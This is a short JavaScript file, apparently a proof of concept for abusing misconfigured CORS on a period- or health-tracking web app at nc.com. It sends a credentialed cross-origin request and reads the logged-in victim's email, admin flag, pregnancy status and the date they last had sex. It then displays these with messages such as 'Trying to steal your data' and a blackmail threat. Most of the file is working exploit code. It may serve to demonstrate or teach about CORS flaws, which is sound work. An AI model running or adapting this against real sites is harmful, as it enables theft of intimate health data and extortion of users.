function findSex(entryMap) {
  lastSex = null
  for (key in entryMap) {
    if (entryMap[key][8] == 1) {
      lastSex = entryMap[key][0]
    }
    console.log(entryMap[key][8])
  }
  return lastSex
}

let _url = "https://www.nc.com:3000/json-cors-origin/appInit"
const mode = document.currentScript.getAttribute('mode');
if (mode == '*') {
  _url = "https://www.nc.com:3000/json-cors-wildcard/appInit"
} else if (mode == 'explicit') {
  _url = "https://www.nc.com:3000/json-cors-explicit/appInit"
}

$(document).ready(function(){

  $("#messagediv").html("Trying to steal your data").addClass("alert alert-warning");

  jQuery.ajax({
   url: _url,
   dataType: 'json',
   data: '{"appStart": true,"runAlgo": true}',
   method: 'POST',
   xhrFields: { withCredentials: true },
   error: function(data){
     $("#messagediv").html("You should log in to your <a target=\"_blank\" href=\"https://www.nc.com:3000/cors/allow-origin/webapp\">nc.com account</a> to get a promotion, when you've done that, simply reload this page").removeClass().addClass("alert alert-success");
   },
   success: function(data) {
    if (data.backendResponse.account.email != null) {
      let message = "Success! Stolen data for user: " + data.backendResponse.account.email;
      if (data.backendResponse.admin == false) {
        message += "<br/>You are not an admin"
      } else {
        message += "<br/>You are an admin"
      }
      if (data.backendResponse.account.pregnantNow == false) {
        message += "<br/>You are not pregnant"
      } else {
        message += "<br/>Wow, you are pregnant"
      }
      sex = findSex(data.backendResponse.uf.entryMap);
      if (sex != null) {
        message += "<br/>You last had sex: " + sex
      } else {
        message += "<br/>You didn't have sex lately."
      }
      message += "<br/>I'll be in touch to blackmail you."
      $("#messagediv").html(message).removeClass().addClass("alert alert-danger");
    }
   }
  });
  /*
  jQuery.ajax({
   url: _getUrl,
   method: 'GET',
   dataType: 'json',
   xhrFields: { withCredentials: true },
   success: function(data) {
     //find user email
     //const obj = JSON.parse(data)
     //console.log(data.backendResponse);
     //console.log(obj);
   }
 });
  var invocation = new XMLHttpRequest();

  const handler = function(data){
    console.log(data)
  }
  function callOtherDomain() {
    if(invocation) {
      invocation.open('GET', _getUrl, true);
      invocation.onreadystatechange = handler;
      invocation.withCredentials = true;
      invocation.send();
    }
  }

  callOtherDomain();


*/



  /*
  jQuery.ajax({
   url: _urlNc,
   dataType: 'text',
   data: '{"appStart": true,"runAlgo": true}',
   method: 'POST',
   xhrFields: { withCredentials: true },
   success: function(data) {
     console.log(data);
   }
  });
  */
  //var xhr = new XMLHttpRequest();
  //xhr.open('GET', _url, true);
  //xhr.withCredentials = true;
  //xhr.send(null);

});
